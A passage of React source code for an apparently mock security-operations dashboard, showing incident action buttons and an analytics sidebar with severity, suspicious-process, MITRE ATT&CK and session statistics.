                  fontSize: 11, fontWeight: 700, cursor: "pointer",
                  transition: "all 0.15s", fontFamily: "inherit",
                  letterSpacing: "0.02em",
                }}
              >
                🛡️ Block Remote IP
              </button>

              <button
                onClick={() => showToast("📦 Binary quarantined to /var/quarantine/")}
                style={{
                  display: "flex", alignItems: "center", gap: 5,
                  padding: "6px 14px", borderRadius: 4,
                  background: "transparent", color: C.text,
                  border: `1px solid ${C.border}`,
                  fontSize: 11, fontWeight: 600, cursor: "pointer",
                  transition: "all 0.15s", fontFamily: "inherit",
                  letterSpacing: "0.02em",
                }}
              >
                📦 Quarantine Binary
              </button>

              <button
                onClick={() => {
                  const json = `{"event":"${s.info}","severity":"${s.severity}","src":"${s.src}","dst":"${s.dst}","pid":${s.pid},"process":"${s.process}","mitre":"${s.mitre}"}`;
                  navigator.clipboard.writeText(json);
                  showToast("📋 UDM JSON copied to clipboard");
                }}
                style={{
                  display: "flex", alignItems: "center", gap: 5,
                  padding: "6px 14px", borderRadius: 4,
                  background: "transparent", color: C.textMuted,
                  border: `1px solid transparent`,
                  fontSize: 11, fontWeight: 500, cursor: "pointer",
                  transition: "all 0.15s", fontFamily: "inherit",
                }}
              >
                📋 Copy UDM JSON
              </button>

              <div style={{ flex: 1 }} />

              <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                <span style={{ fontSize: 9, color: C.textDimmer, textTransform: "uppercase", letterSpacing: "0.06em" }}>Case ID</span>
                <span className="mono" style={{ fontSize: 10, color: C.accent }}>INC-2024-0847</span>
              </div>
            </div>
          </div>

          {/* Right Sidebar: Analytics */}
          <div style={{
            width: 260, flexShrink: 0,
            display: "flex", flexDirection: "column",
            overflow: "hidden",
          }}>
            <PanelHeader icon="📊">Analytics</PanelHeader>
            <div style={{ flex: 1, overflowY: "auto", padding: "10px 12px", display: "flex", flexDirection: "column", gap: 14 }}>

              {/* Severity distribution */}
              <div>
                <div style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginBottom: 8 }}>
                  Incident Severity
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                  {SEVERITY_DIST.map(item => (
                    <div key={item.label}>
                      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 3 }}>
                        <span style={{ fontSize: 10, color: item.color, fontWeight: 600 }}>{item.label}</span>
                        <span className="mono" style={{ fontSize: 10, color: C.textMuted }}>{item.count}</span>
                      </div>
                      <MiniBar value={item.count} max={totalDist} color={item.color} />
                    </div>
                  ))}
                </div>
                {/* Stacked bar */}
                <div style={{ display: "flex", height: 6, borderRadius: 3, overflow: "hidden", marginTop: 8 }}>
                  {SEVERITY_DIST.map(item => (
                    <div
                      key={item.label}
                      style={{ flex: item.count, background: item.color, opacity: 0.85 }}
                      title={`${item.label}: ${item.count}`}
                    />
                  ))}
                </div>
              </div>

              <div style={{ height: 1, background: C.borderSubtle }} />

              {/* Top suspicious processes */}
              <div>
                <div style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginBottom: 8 }}>
                  Top Suspicious Processes
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
                  {TOP_PROCESSES.map((proc, i) => {
                    const pc = severityColors(proc.severity);
                    return (
                      <div key={proc.name} style={{ display: "flex", alignItems: "center", gap: 8 }}>
                        <span className="mono" style={{ fontSize: 9, color: C.textDimmer, width: 12, textAlign: "right" }}>{i + 1}</span>
                        <span className="mono" style={{
                          fontSize: 10, padding: "1px 6px", borderRadius: 3, flex: "0 0 auto",
                          background: pc.bg, color: pc.text, border: `1px solid ${pc.border}`,
                          minWidth: 90,
                        }}>{proc.name}</span>
                        <MiniBar value={proc.count} max={TOP_PROCESSES[0].count} color={pc.text} />
                        <span className="mono" style={{ fontSize: 9, color: C.textDimmer, width: 22, textAlign: "right" }}>{proc.count}</span>
                      </div>
                    );
                  })}
                </div>
              </div>

              <div style={{ height: 1, background: C.borderSubtle }} />

              {/* MITRE Technique breakdown */}
              <div>
                <div style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginBottom: 8 }}>
                  MITRE ATT&CK Coverage
                </div>
                <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
                  {MITRE_BREAKDOWN.map(item => {
                    const mc = severityColors(item.severity);
                    return (
                      <div key={item.tag} style={{ display: "flex", alignItems: "center", gap: 7 }}>
                        <span className="mono" style={{
                          fontSize: 9, padding: "1px 5px", borderRadius: 3,
                          background: C.accentDim, color: C.accent,
                          border: `1px solid #2A4A7A`,
                          width: 56, textAlign: "center", flexShrink: 0,
                        }}>{item.tag}</span>
                        <div style={{ flex: 1, minWidth: 0 }}>
                          <div style={{ fontSize: 9, color: C.textMuted, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", marginBottom: 2 }}>{item.name}</div>
                          <MiniBar value={item.count} max={MITRE_BREAKDOWN[0].count} color={mc.text} />
                        </div>
                        <span className="mono" style={{ fontSize: 9, color: C.textDimmer, width: 18, textAlign: "right" }}>{item.count}</span>
                      </div>
                    );
                  })}
                </div>
              </div>

              <div style={{ height: 1, background: C.borderSubtle }} />

              {/* Quick stats */}
              <div>
                <div style={{ fontSize: 9, fontWeight: 700, letterSpacing: "0.08em", textTransform: "uppercase", color: C.textMuted, marginBottom: 8 }}>
                  Session Stats
                </div>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 6 }}>
                  {[
                    { label: "Endpoints", value: "247", color: C.text },
                    { label: "Active C2", value: "3", color: C.danger },
                    { label: "Blocked IPs", value: "128", color: C.warning },
                    { label: "Clean", value: "211", color: C.safe },
                    { label: "Open Cases", value: "14", color: C.accent },
                    { label: "MTTR", value: "4.2h", color: C.textMuted },
                  ].map(stat => (
                    <div key={stat.label} style={{
                      padding: "7px 8px", borderRadius: 4,
                      background: C.borderSubtle, border: `1px solid ${C.border}`,
                    }}>
                      <div className="mono" style={{ fontSize: 14, fontWeight: 700, color: stat.color }}>{stat.value}</div>
                      <div style={{ fontSize: 9, color: C.textDimmer, marginTop: 2, textTransform: "uppercase", letterSpacing: "0.06em" }}>{stat.label}</div>
                    </div>
                  ))}
                </div>
              </div>

            </div>
          </div>
        </div>
      </div>

      {/* ── Toast notification ───────────────────────────────────────────────── */}
      {toastMsg && (
        <div style={{
          position: "fixed", bottom: 20, left: "50%", transform: "translateX(-50%)",
          padding: "10px 18px", borderRadius: 6,
          background: C.surface, border: `1px solid ${C.border}`,
          color: C.text, fontSize: 12, fontWeight: 500,
          boxShadow: "0 4px 20px rgba(0,0,0,0.5)",
          zIndex: 100, pointerEvents: "none",
          display: "flex", alignItems: "center", gap: 8,
        }}>
          <div style={{ width: 6, height: 6, borderRadius: "50%", background: C.safe }} />
          {toastMsg}
        </div>
      )}
    </div>
  );
}
